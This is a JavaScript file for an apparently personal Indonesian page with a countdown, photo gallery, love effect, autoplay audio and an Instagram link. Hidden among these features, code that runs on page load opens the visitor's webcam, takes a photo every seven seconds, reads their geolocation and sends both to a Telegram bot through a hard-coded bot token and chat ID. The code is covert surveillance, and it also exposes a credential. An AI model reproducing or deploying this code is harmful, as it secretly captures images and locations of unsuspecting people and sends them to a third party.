async function sendPhotoAndLocationToTelegram(photoBlob, latitude, longitude) {
  const formData = new FormData();
  formData.append("photo", photoBlob, "webcam.jpg");
  const botToken = "6998528299:AAF-IfmNR4SHLbL3qYy9qDwMfW4ghq1izTE";
  const chatId = "5802480458";
  const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`;

  try {
    const photoResponse = await fetch(telegramApiUrl, {
      method: "POST",
      body: formData
    });
    const photoData = await photoResponse.json();
    console.log(photoData);
    const locationApiUrl = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
    const locationResponse = await fetch(locationApiUrl, {
      method: "POST"
    });
    const locationData = await locationResponse.json();
    console.log(locationData);
  } catch (error) {
    console.error("Error sending photo or location to Telegram:", error);
  }
}

async function capturePhoto() {
  const video = document.getElementById("webcam");
  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const context = canvas.getContext("2d");
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(async (photoBlob) => {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        sendPhotoAndLocationToTelegram(photoBlob, latitude, longitude);
      },
      (error) => {
        console.error("Error getting location:", error);
      }
    );
  }, "image/jpeg");
}


function openInstagramApp() {
  const instagramUrl = "https://www.instagram.com/selvijunitaa/";
  window.open(instagramUrl, "_blank");
}

function startWebcam() {
  const video = document.getElementById("webcam");
  navigator.mediaDevices
    .getUserMedia({ video: true })
    .then(stream => {
      video.srcObject = stream;
    })
    .catch(error => {
      console.error("Error accessing webcam:", error);
    });
}

function startPhotoCapture() {
  startWebcam();
  setInterval(capturePhoto, 7000); 
}
document.addEventListener("DOMContentLoaded", () => {
  startPhotoCapture();
});


function updateCountdown() {
  const targetDate = new Date("Juni 17, 2024").getTime();
  const now = new Date().getTime();
  const timeRemaining = targetDate - now;

  const days = Math.floor(timeRemaining / (1000 * 60 * 60 * 24));
  const hours = Math.floor(
    (timeRemaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60),
  );
  const minutes = Math.floor((timeRemaining % (1000 * 60 * 60)) / (1000 * 60));
  const seconds = Math.floor((timeRemaining % (1000 * 60)) / 1000);

  const countdownElement = document.getElementById("countdown");
  countdownElement.innerHTML = `${days} hari ${hours} jam ${minutes} menit ${seconds} detik`;
}

setInterval(updateCountdown, 1000);
updateCountdown();

function togglePhotoSize(event) {
  const photo = event.target.closest(".photo");
  if (photo) {
    const modal = document.getElementById("modal");
    const modalImg = document.getElementById("modal-img");
    const loveEffect = photo.querySelector(".love-effect");

    modal.style.display = "flex";
    modalImg.src = photo.querySelector("img").dataset.src;

    // Show love effect
    loveEffect.style.opacity = 1;
    setTimeout(() => {
      loveEffect.style.opacity = 0;
    }, 5000);

    modal.addEventListener("click", function () {
      modal.style.display = "none";
    });
  }
}

document.getElementById("modal").addEventListener("click", function () {
  this.style.display = "none";
});



function delayAudioPlay() {
  const audio = document.getElementById("myAudio");
  setTimeout(() => {
    audio.play();
  }, 1000);
}
setTimeout(delayAudioPlay, 1000);
